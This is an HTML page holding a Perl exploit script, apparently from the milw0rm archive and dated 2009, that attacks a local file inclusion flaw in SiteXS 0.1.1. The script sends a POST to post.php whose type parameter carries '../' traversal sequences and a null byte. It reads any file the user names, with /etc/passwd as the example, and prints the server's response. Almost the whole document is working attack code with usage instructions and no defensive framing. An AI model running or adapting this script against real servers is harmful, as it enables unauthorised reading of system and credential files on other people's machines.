<html><head><title>SiteXS <= 0.1.1 (type) Local File Inclusion Exploit</title></head><pre># --+++==========================================================+++--
# --+++====== SiteXS &lt;= 0.1.1 Local File Inclusion Exploit ======+++--
# --+++==========================================================+++--


#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket;

sub usage ()
{
	die &quot;\n\nSiteXS &lt;= 0.1.1 Local File Inclusion Exploit&quot;.
	    &quot;\n[+] Author  : darkjoker&quot;.
	    &quot;\n[+] Site    : http://darkjoker.net23.net&quot;.
	    &quot;\n[+] Download: http://heanet.dl.sourceforge.net/sourceforge/sitexs/sitexs-0.1.1.tar.gz&quot;.
	    &quot;\n[+] Usage   : perl ${0} &lt;hostname&gt; &lt;path&gt; &lt;file&gt;&quot;.
	    &quot;\n[+] Ex.     : perl ${0} localhost /SiteXS /etc/passwd&quot;.
	    &quot;\n[+] Notes   : Have fun\n\n&quot;;
}

my ($host, $path, $file) = @ARGV;

usage if (!$file);

my $sock = new IO::Socket::INET (
	PeerHost =&gt; $host,
	PeerPort =&gt; 80,
	Proto    =&gt; &quot;tcp&quot;,
);

my $up = &quot;../&quot;x10;

$file =~ s/^\/// if ($file =~ /^\//);

my $varz = &quot;type=${up}${file}%00&quot;;

my $post = &quot;POST ${path}/post.php HTTP/1.1\r\n&quot;.
	&quot;Host:	${host}\r\n&quot;.
	&quot;Connection: Close\r\n&quot;.
	&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
	&quot;Content-Length: &quot; . length ($varz) . &quot;\r\n\r\n&quot;.
	$varz;

print $sock $post;

my $w = 0;

while (&lt;$sock&gt;)
{
	$w = 1 if ($w &lt; 0);
	$w = -1 if ($_ =~ /Content-Type: text\/html/);
	$w = 0 if ($_ =~ /&lt;br \/&gt;/);
	print $_ if ($w == 1);

}

print &quot;\n\n&quot;;

close ($sock);

# milw0rm.com [2009-01-26]</pre></html>